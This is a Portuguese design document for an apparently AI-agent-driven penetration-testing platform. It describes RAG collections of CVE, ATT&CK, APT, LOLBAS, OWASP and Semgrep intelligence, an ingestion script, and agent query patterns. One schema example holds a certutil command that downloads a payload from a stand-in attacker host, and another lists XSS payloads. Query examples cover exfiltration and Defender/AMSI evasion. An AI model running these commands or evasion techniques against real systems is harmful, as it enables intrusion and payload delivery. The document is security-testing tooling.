# Estratégia RAG — Bellatrix India

> **Versão:** 2.0 | **Status:** Ativo | **Revisão:** 2026-04-19

---

## 1. Visão Geral

O sistema RAG (Retrieval-Augmented Generation) fornece ao PlannerAgent e MicroAgents o contexto de inteligência necessário para tomar decisões informadas durante campanhas. Toda a infraestrutura RAG é **local-first** — nenhum dado de campanha ou query é transmitido para serviços externos de indexação.

**Componentes:**
- **Qdrant** — vector database local (Docker container)
- **TextEmbedder** — gera embeddings via LLM provider (slot `simple`)
- **IntelClient** — queries tipadas por collection
- **Ingest Pipeline** — scripts de ingestão de fontes externas

---

## 2. Collections Qdrant

### 2.1 `cve_intel`

**Propósito:** Base de CVEs indexados para identificar vulnerabilidades em componentes detectados.

**Fontes:**
- NVD (National Vulnerability Database) — feed JSON completo
- OSV (Open Source Vulnerabilities) — ecosistemas: npm, PyPI, crates.io, Maven, Go, Hex
- GitHub Advisory Database

**Schema de documento:**

```json
{
  "id": "CVE-2021-44228",
  "cwe": ["CWE-502", "CWE-400"],
  "cvss_score": 10.0,
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
  "severity": "Critical",
  "description": "Apache Log4j2 JNDI injection allowing RCE...",
  "affected_products": [
    {"vendor": "apache", "product": "log4j", "version_range": ">=2.0,<2.15"}
  ],
  "exploit_available": true,
  "patch_available": true,
  "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
  "published": "2021-12-10",
  "tags": ["rce", "jndi", "java", "log4j", "deserialization"]
}
```

**Queries típicas:**
```rust
// "quais CVEs afetam Rails 7.0?"
intel.query_cve("Rails 7.0 Ruby web framework vulnerabilities", limit: 10)

// "CVEs com CVSS >= 9 em componentes JavaScript"
intel.query_cve_filtered(tech: "javascript", min_cvss: 9.0)
```

---

### 2.2 `attack_ttp`

**Propósito:** MITRE ATT&CK framework — técnicas, sub-técnicas e procedimentos para planejamento de ataque e relatórios.

**Fontes:**
- MITRE ATT&CK STIX 2.1 (Enterprise + ICS + Mobile)
- Atualização mensal automática

**Schema de documento:**

```json
{
  "technique_id": "T1190",
  "name": "Exploit Public-Facing Application",
  "tactic": "Initial Access",
  "description": "Adversaries may attempt to exploit a weakness in...",
  "sub_techniques": ["T1190.001"],
  "platforms": ["Linux", "Windows", "macOS", "Network"],
  "data_sources": ["Application Log", "Network Traffic"],
  "mitigations": ["M1016", "M1026", "M1050"],
  "detection": "Monitor application logs for unusual activity...",
  "examples": [
    {"group": "APT28", "software": "S0053", "description": "..."}
  ],
  "tags": ["web", "exploitation", "initial-access", "rce"]
}
```

**Queries típicas:**
```rust
// "técnicas para initial access via web application"
intel.query_ttp("web application initial access exploitation", tactic: "Initial Access")

// "TTPs de persistência em Windows sem escrita em disco"
intel.query_ttp("Windows persistence fileless memory", platform: "Windows")
```

---

### 2.3 `apt_playbooks`

**Propósito:** TTPs documentados de grupos APT para contextualizar campanhas avançadas e simular adversários específicos.

**Fontes:**
- MITRE ATT&CK Groups (STIX)
- Relatórios técnicos públicos: Mandiant, CrowdStrike, Secureworks, CISA advisories
- ETDA Threat Group Cards

**Schema de documento:**

```json
{
  "group_id": "G0007",
  "name": "APT28",
  "aliases": ["Fancy Bear", "STRONTIUM", "Sofacy"],
  "country": "Russia",
  "motivation": ["Espionage"],
  "targets": ["Government", "Military", "Defense", "Media"],
  "ttps": [
    {
      "technique": "T1566.001",
      "description": "Spearphishing with malicious Office attachments",
      "tools": ["X-Agent", "CHOPSTICK"]
    }
  ],
  "known_tools": ["X-Agent", "CHOPSTICK", "Zebrocy", "LoFiSe"],
  "active_since": "2004",
  "last_observed": "2024",
  "tags": ["apt", "russia", "espionage", "government"]
}
```

**Queries típicas:**
```rust
// "grupos APT que atacam infraestrutura financeira com phishing"
intel.query_apt("financial sector phishing credential theft")

// "TTPs do Lazarus Group em ambientes Windows"
intel.query_apt_group("Lazarus Group", platform: "Windows")
```

---

### 2.4 `lolbas_lolol`

**Propósito:** Living-Off-The-Land Binaries, Scripts e Libraries — binários nativos de Windows e Linux que podem ser abusados para execução, evasão e persistência.

**Fontes:**
- LOLBAS Project (Windows): lolbas-project.github.io
- GTFOBins (Linux): gtfobins.github.io
- LOLOL (Living Off the Land On Linux)

**Schema de documento:**

```json
{
  "name": "certutil.exe",
  "platform": "Windows",
  "type": "Binary",
  "path": "C:\\Windows\\System32\\certutil.exe",
  "functions": [
    {
      "type": "Download",
      "description": "Download arbitrary files via HTTPS",
      "command": "certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe",
      "mitre_ttp": "T1105"
    },
    {
      "type": "Encode",
      "description": "Base64 encode/decode files",
      "command": "certutil.exe -encode payload.exe payload.b64",
      "mitre_ttp": "T1027"
    }
  ],
  "detection": "Monitor certutil.exe for network connections or unusual parameters",
  "tags": ["download", "encode", "windows", "builtin", "evasion"]
}
```

**Queries típicas:**
```rust
// "binários Windows nativos para download de payloads"
intel.query_lolbas("Windows native binary file download", platform: "Windows")

// "GTFOBins para escalação de privilégios via sudo"
intel.query_lolbas("Linux sudo privilege escalation", platform: "Linux")
```

---

### 2.5 `owasp_patterns`

**Propósito:** Padrões de vulnerabilidade OWASP — WSTG checklist, Top 10, ASVS — para guiar testes manuais e automáticos.

**Fontes:**
- OWASP Web Security Testing Guide (WSTG) v4.2
- OWASP Top 10 (Web + API + Mobile)
- OWASP ASVS (Application Security Verification Standard)

**Schema de documento:**

```json
{
  "id": "WSTG-INPV-01",
  "category": "Input Validation",
  "name": "Testing for Reflected Cross Site Scripting",
  "description": "Reflected XSS occurs when...",
  "test_objectives": [
    "Identify variables reflected in responses",
    "Assess input validation and output encoding"
  ],
  "test_steps": [
    "1. Map all user-supplied inputs",
    "2. Submit XSS payloads in each input",
    "3. Observe response for unencoded reflection"
  ],
  "payloads": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"],
  "tools": ["Burp Suite", "OWASP ZAP", "Caido", "ffuf"],
  "remediation": "Implement context-aware output encoding",
  "cwe": ["CWE-79"],
  "cvss_range": "Medium to High",
  "tags": ["xss", "reflected", "input-validation", "web"]
}
```

---

### 2.6 `ptes_phases`

**Propósito:** Metodologia PTES (Penetration Testing Execution Standard) para estruturar campanhas de pentest.

**Fontes:**
- PTES Technical Guidelines (pentest-standard.org)
- OWASP Testing Guide como complemento

**Schema de documento:**

```json
{
  "phase": "Intelligence Gathering",
  "phase_order": 2,
  "description": "Collect information about the target...",
  "activities": [
    {
      "name": "OSINT",
      "description": "Passive information gathering",
      "tools": ["amass", "subfinder", "shodan", "censys"],
      "outputs": ["domain_list", "email_list", "employee_list"]
    }
  ],
  "entry_criteria": "Pre-engagement documentation signed",
  "exit_criteria": "Attack surface map complete",
  "tags": ["methodology", "planning", "recon"]
}
```

---

### 2.7 `oss_vuln_patterns`

**Propósito:** Padrões de código vulnerável extraídos de CVEs históricos em projetos OSS — usado para hunting de vulnerabilidades similares em código novo.

**Fontes:**
- CVE Details com patches públicos (antes/depois)
- GitHub Security Advisories com diff de fix
- OSS-Fuzz bug reports

**Schema de documento:**

```json
{
  "cve": "CVE-2022-3602",
  "project": "OpenSSL",
  "language": "C",
  "cwe": "CWE-787",
  "vuln_pattern": {
    "description": "Stack buffer overflow in X.509 email address parsing",
    "vulnerable_code": "/* ossl_punycode_decode */ ... memcpy(dst, src, len)",
    "root_cause": "Missing bounds check before memcpy with attacker-controlled length"
  },
  "fix_pattern": {
    "description": "Add explicit bounds check before memcpy",
    "patch_summary": "if (len > sizeof(dst)) return 0;"
  },
  "detection_hints": ["memcpy with length from external input", "strcpy without bounds"],
  "semgrep_rule_hint": "pattern: memcpy($DST, $SRC, $LEN) where $LEN from user input",
  "tags": ["buffer-overflow", "c", "openssl", "parsing", "memory-safety"]
}
```

---

### 2.8 `semgrep_rules`

**Propósito:** Regras Semgrep indexadas semanticamente — permite ao agente encontrar a regra correta para um padrão de vulnerabilidade detectado.

**Fontes:**
- Semgrep Registry (semgrep.dev/r)
- Regras customizadas do projeto em `rules/semgrep/`

**Schema de documento:**

```json
{
  "rule_id": "python.django.security.injection.tainted-sql-string",
  "name": "SQL Injection via tainted string in Django ORM",
  "language": "python",
  "framework": "django",
  "category": "injection",
  "severity": "ERROR",
  "cwe": "CWE-89",
  "pattern_summary": "cursor.execute() with string format using request.GET",
  "tags": ["sqli", "django", "python", "injection", "taint"]
}
```

---

## 3. Pipeline de Ingestão

### 3.1 Script principal

```bash
#!/usr/bin/env bash
# scripts/ingest-rag.sh

set -euo pipefail

QDRANT_URL="${QDRANT_URL:-http://localhost:6333}"
WORKSPACE="$(dirname "$0")/.."

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"; }

# NVD CVE feed
log "Ingerindo NVD CVE feed..."
python3 "$WORKSPACE/scripts/ingesters/nvd_ingester.py" \
  --qdrant-url "$QDRANT_URL" \
  --collection cve_intel \
  --years 2020 2021 2022 2023 2024 2025

# MITRE ATT&CK
log "Ingerindo MITRE ATT&CK..."
python3 "$WORKSPACE/scripts/ingesters/attack_ingester.py" \
  --qdrant-url "$QDRANT_URL" \
  --collection attack_ttp \
  --domains enterprise ics

# LOLBAS + GTFOBins
log "Ingerindo LOLBAS e GTFOBins..."
python3 "$WORKSPACE/scripts/ingesters/lolbas_ingester.py" \
  --qdrant-url "$QDRANT_URL" \
  --collection lolbas_lolol

# OWASP WSTG
log "Ingerindo OWASP WSTG..."
python3 "$WORKSPACE/scripts/ingesters/owasp_ingester.py" \
  --qdrant-url "$QDRANT_URL" \
  --collection owasp_patterns

# Semgrep Registry
log "Ingerindo regras Semgrep..."
python3 "$WORKSPACE/scripts/ingesters/semgrep_ingester.py" \
  --qdrant-url "$QDRANT_URL" \
  --collection semgrep_rules \
  --categories injection auth crypto deserialization memory

log "Ingestão concluída."
```

### 3.2 Embeddings

Cada documento é embedado usando o provider LLM configurado no slot `simple`:

```rust
// crates/intel/src/embedder.rs
pub struct TextEmbedder {
    provider: Arc<dyn LlmProvider>,
}

impl TextEmbedder {
    pub async fn embed_document(&self, doc: &IntelDocument) -> anyhow::Result<Vec<f32>> {
        // Concatena campos relevantes para embedding
        let text = format!("{} {} {}", doc.name, doc.description, doc.tags.join(" "));
        self.provider.embed(&text).await
    }
}
```

### 3.3 Dimensão dos vetores

| Provider | Dimensão | Modelo de embedding |
|---|---|---|
| OpenAI | 1536 | text-embedding-3-small |
| Anthropic | Não suporta embed nativo | Usar OpenAI-compat |
| DeepSeek | 1024 | deepseek-embedding (se disponível) |
| Ollama | 768–4096 | nomic-embed-text ou mxbai-embed-large |

**Configurar dimensão em `providers.toml`:**
```toml
[providers.provider_a]
embedding_model = "text-embedding-3-small"
embedding_dimensions = 1536
```

---

## 4. Padrões de Query por Caso de Uso

### 4.1 PlannerAgent — planejamento de campanha

```rust
// Contexto inicial de campanha
let ttp_context = intel.query_ttp(
    &format!("web application attacks on {}", tech_stack),
    limit: 15,
).await?;

let cve_context = intel.query_cve(
    &format!("{} vulnerabilities CVSS high critical", tech_stack),
    limit: 10,
).await?;

let owasp_context = intel.query_owasp(
    "web application testing checklist",
    limit: 5,
).await?;
```

### 4.2 ExploitAgent — seleção de técnica

```rust
// Dado um finding de SQLi, busca procedimentos de exploração
let procedures = intel.query_ttp(
    "SQL injection exploitation exfiltration database",
    tactic: "Collection",
    limit: 5,
).await?;

let lolbas = intel.query_lolbas(
    "Windows data exfiltration without download tools",
    platform: "Windows",
    limit: 5,
).await?;
```

### 4.3 SastAgent — seleção de regras

```rust
// Dado um arquivo PHP, busca regras Semgrep relevantes
let rules = intel.query_semgrep_rules(
    "PHP injection deserialization authentication bypass",
    language: "php",
    limit: 20,
).await?;
```

### 4.4 MalwareAgent — técnicas de evasão

```rust
// Dado target Windows 11 com Defender ativo
let evasion_ttps = intel.query_ttp(
    "Windows Defender evasion AMSI bypass memory injection",
    tactic: "Defense Evasion",
    platform: "Windows",
    limit: 10,
).await?;

let lolbas_evasion = intel.query_lolbas(
    "Windows execution signed binary proxy",
    platform: "Windows",
    limit: 5,
).await?;
```

---

## 5. Atualização das Collections

### 5.1 Frequência recomendada

| Collection | Frequência | Método |
|---|---|---|
| `cve_intel` | Semanal | Script cron + NVD feed incremental |
| `attack_ttp` | Mensal | Download STIX completo |
| `apt_playbooks` | Manual | Após novos relatórios relevantes |
| `lolbas_lolol` | Mensal | Pull do repositório GitHub |
| `owasp_patterns` | Por release OWASP | Manual após nova versão WSTG |
| `oss_vuln_patterns` | Semanal | Script + GitHub Advisory Database |
| `semgrep_rules` | Semanal | `semgrep --update` + re-ingestão |

### 5.2 Atualização incremental

```bash
# Apenas novos CVEs desde a última semana
./scripts/ingest-rag.sh --incremental --collection cve_intel --days 7

# Re-ingestão completa de uma collection
./scripts/ingest-rag.sh --full --collection attack_ttp
```
